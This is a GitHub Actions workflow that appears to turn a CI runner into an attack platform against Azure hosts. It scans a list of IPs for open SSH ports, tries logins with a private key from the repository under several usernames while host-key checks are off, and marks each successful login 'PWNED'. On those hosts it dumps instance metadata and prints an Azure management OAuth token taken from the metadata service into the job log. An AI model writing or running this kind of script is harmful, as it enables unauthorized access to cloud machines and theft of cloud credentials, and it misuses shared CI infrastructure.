name: azfast
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  f:
    runs-on: ubuntu-latest
    timeout-minutes: 9
    steps:
      - uses: actions/checkout@v4
      - name: probe
        run: |
          set +e
          echo "EGRESS=$(curl -s -m 8 https://ifconfig.me)"
          echo "IMDS_SELF=$(curl -s -m 5 -H Metadata:true 'http://169.254.169.254/metadata/instance/compute?api-version=2021-11-15' | head -c 200)"
          chmod 600 az/azadmin.pem az/ibm_key.pem 2>/dev/null
          awk -F'\t' '{print $2}' az/hosts.tsv | sort -u > ips.txt
          echo "ip_count=$(wc -l < ips.txt)"
          chk(){ timeout 3 bash -c "exec 3<>/dev/tcp/$1/22" 2>/dev/null && echo "OPEN $1"; }
          export -f chk
          cat ips.txt | xargs -P 32 -I{} bash -c 'chk {}' > open.txt 2>/dev/null
          echo "open_count=$(wc -l < open.txt)"
          cat open.txt
          while read -r _ ip; do
            for u in t19 azureuser ubuntu; do
              out=$(timeout 20 ssh -i az/azadmin.pem -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o PreferredAuthentications=publickey -o LogLevel=ERROR "$u@$ip" \
                'echo LOGIN_OK host=$(hostname) uid=$(id -u); curl -s -m 5 -H Metadata:true "http://169.254.169.254/metadata/instance/compute?api-version=2021-11-15" | head -c 400; echo; T=$(curl -s -m 6 -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"); echo "ARMTOK=${T:0:40}"; echo "$T" | head -c 4000' 2>&1 | head -12)
              echo "TRY $ip $u => $(echo "$out" | head -2 | tr '\n' ' ')"
              case "$out" in *LOGIN_OK*) echo "PWNED $ip $u"; echo "$out";; esac
            done
          done < open.txt
